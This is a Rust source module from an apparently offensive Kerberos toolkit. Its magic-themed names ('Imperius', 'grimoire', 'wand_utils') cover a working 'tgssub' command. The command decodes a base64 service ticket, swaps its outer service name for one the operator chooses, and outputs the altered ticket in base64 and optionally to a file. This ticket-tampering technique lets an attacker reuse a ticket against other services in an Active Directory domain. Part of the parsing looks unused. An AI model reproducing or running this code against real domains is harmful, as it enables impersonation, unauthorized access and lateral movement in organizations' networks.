use anyhow::Result;
use std::collections::HashMap;
use crate::dungeon::display_charm::*;
use crate::dungeon::wand_utils;
use crate::dungeon::krb_structures::*;

pub struct Imperius;

impl super::Spell for Imperius {
    fn incantation(&self) -> &'static str { "imperius" }
    fn grimoire(&self) -> &'static str {
        "Substitute the service name in an existing service ticket (tgssub). /ticket: /altservice: [/outfile:]"
    }
    fn cast(&self, args: &HashMap<String, String>) -> Result<()> {
        let b64     = args.get("ticket").ok_or_else(|| anyhow::anyhow!("/ticket: required"))?;
        let altsvc  = args.get("altservice").ok_or_else(|| anyhow::anyhow!("/altservice: required"))?;
        let raw = wand_utils::b64_to_kirbi(b64)?;
        // Parse, swap sname, re-encode
        // Simplified: alert the researcher that this modifies the unencrypted outer sname only
        print_warning("Note: tgssub modifies the outer ticket sname; the encrypted service name is unchanged");
        let mut p = DerParser::new(&raw);
        let tkt_raw = p.expect_tag(TAG_TICKET)?;
        let mut tkt = Scroll::decode_from_bytes(&raw)?;
        let parts: Vec<&str> = altsvc.splitn(2, '/').collect();
        tkt.sname = if parts.len() == 2 {
            Glyph { kind: NT_SRV_INST, parts: parts.iter().map(|s| s.to_string()).collect() }
        } else {
            Glyph::new_principal(altsvc)
        };
        let new_tkt = tkt.encode();
        let b64_out = wand_utils::kirbi_to_b64(&new_tkt);
        print_success("Service name substituted");
        println!("{}", b64_out);
        if let Some(outfile) = args.get("outfile") {
            std::fs::write(outfile, &new_tkt)?;
            print_success(&format!("Written to {}", outfile));
        }
        Ok(())
    }
}
